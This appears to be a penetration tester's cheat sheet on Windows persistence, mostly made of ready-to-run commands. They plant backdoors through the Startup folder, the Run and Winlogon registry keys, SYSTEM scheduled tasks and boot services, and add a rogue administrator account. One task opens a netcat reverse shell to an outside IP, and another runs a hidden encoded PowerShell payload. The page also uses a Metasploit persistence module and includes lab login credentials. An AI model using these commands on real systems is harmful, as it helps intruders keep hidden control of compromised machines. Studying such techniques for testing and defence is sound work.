# 🔨 Persistence Notes

## Low Privilege Persistence

### Startup Folder Persistence

The following assumes the following:

* Privilege escalation is not of concern
* You have access to at least to a low privilege user account.

Dropping shell scripts / binaries into the following folder will execute them on user login:

```
C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

![](<../../../.gitbook/assets/image (1862).png>)

### Registry Persistence

Providing the current working user has permission to create registry keys under `'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'` . A backdoor executable / script can be created to run on user logon.&#x20;

The example below assumes a Backdoor executable is currently stored in `"C:\Users\%username%\AppData\Roaming\"`

#### CMD:

`reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\%username%\AppData\Roaming\backdoor.exe"`

## Privileged Persistence

RDP Temp

```bash
xfreerdp /v:10.10.229.68 /u:Administrator /p:tryhackme123! +clipboard /dynamic-resolution /drive:/home/kali,share
```

### User Creation

Persistence may exist through user accounts. Privileged accounts are able to create new users on the target system.

{% tabs %}
{% tab title="CMD" %}
```python
net user AkimboViper Password123 /add
net localgroup administrators /add AkimboViper
```

![](<../../../.gitbook/assets/image (1863).png>)
{% endtab %}

{% tab title="Powershell" %}
```bash
 New-LocalUser "AkimboViper" -Password "Password123"
 Add-LocalGroupMember -Group "Administrators" -Member "AkimboViper"
```
{% endtab %}
{% endtabs %}

### Registry Persistence

Again, the registry can be used to maintain persistence. The command below will set a binary to execute when any user logs into to the system.

`reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, C:\Users\Administrator\AppData\Roaming\backdoor.exe" /f`

### Scheduled Tasks

The command below will create a sheduled task that every minute will execute 'ReverseShell.exe'. This is set to run as the SYSTEM account.

```bash
# Reverse Shell
schtasks /create /sc minute /mo 1 /tn "Persistence" /tr C:\ReverseShell.exe /ru "SYSTEM"

# Netcat
schtasks /create /sc minute /mo 1 /tn "Persistence" /tr 'c:\Users\User\Downloads/nc.exe 10.10.10.10 443 -e cmd.exe'
```

**PowerShell with custom payload**

```powershell
function PersistentTask {

	$TaskName = "Persistence"
	$Trigger = New-ScheduledTaskTrigger `
	-Daily `
	-At 09:00
	
	$Action = New-ScheduledTaskAction `
	-Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
	-Argument "-Sta -Nop -Window Hidden -EncodedCommand <EncodedCommand>" `
	-WorkingDirectory "C:\Windows\System32"

	Register-ScheduledTask `
	-TaskName $TaskName `
	-Trigger $Trigger `
	-Action $Action `
	-Force

}

PersistentTask
```

### Services

PowerShell can be leveraged to create a new Service that, on boot will execute a defined binary / script.

```java
New-Service -Name "<SERVICE_NAME>" -BinaryPathName "<PATH_TO_BINARY>" -Description "<SERVICE_DESCRIPTION>" -StartupType "Boot"
New-Service -Name "Backdoor" -BinaryPathName "C:\Users\Administrator\AppData\Roaming\backdoor.exe" -StartupType "Boot"
```

## Metasploit

```
use exploit/windows/local/persistence

Description:
  This module will install a payload that is executed during boot. It 
  will be executed either at user logon or system startup via the 
  registry value in "CurrentVersion\Run" (depending on privilege and 
  selected method).
```

Configured options shown below. The STARTUP value can be changed to SYSTEM from USER if correct permissions are in place to perform the action.

![](<../../../.gitbook/assets/image (1864).png>)

Successful execution:

![](<../../../.gitbook/assets/image (1865).png>)
